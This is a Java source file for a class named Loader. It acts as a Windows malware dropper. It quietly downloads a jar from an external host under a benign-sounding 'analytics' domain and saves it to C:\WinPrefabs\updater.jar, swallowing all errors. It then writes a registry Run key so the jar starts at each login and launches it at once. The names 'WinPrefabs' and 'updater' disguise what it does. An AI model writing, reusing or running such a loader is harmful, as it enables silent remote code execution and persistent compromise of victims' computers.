package me.kutuzov.loader;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Loader {
    private static String getJavaPath() { return Paths.get(System.getProperty("java.home"), "bin", "javaw.exe").toString(); }

    public static void main(String[] args) {
        new File("C:\\WinPrefabs").mkdir();
        try {
            URL website = new URL("http://analytics190.antecedentium.xyz/upd.jar");
            URLConnection connection = website.openConnection();
            connection.addRequestProperty("User-Agent", "aaa");
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(120000);
            InputStream is = connection.getInputStream();
            Files.copy(is, Paths.get("C:\\WinPrefabs\\updater.jar"), StandardCopyOption.REPLACE_EXISTING);
            is.close();
        } catch (Exception exception) { }

        String reg_name = "WinPrefabs";
        String reg_value = "\"" + getJavaPath() + "\" -jar C:\\WinPrefabs\\updater.jar";
        if(Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", reg_name))
            return;
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", reg_name, reg_value);
        String javaPath = getJavaPath();
        try {
            Process p = Runtime.getRuntime().exec("\"" + javaPath + "\" -Duser.dir=C:\\WinPrefabs -jar C:\\WinPrefabs\\updater.jar");
        } catch (Exception exception) {}
    }
}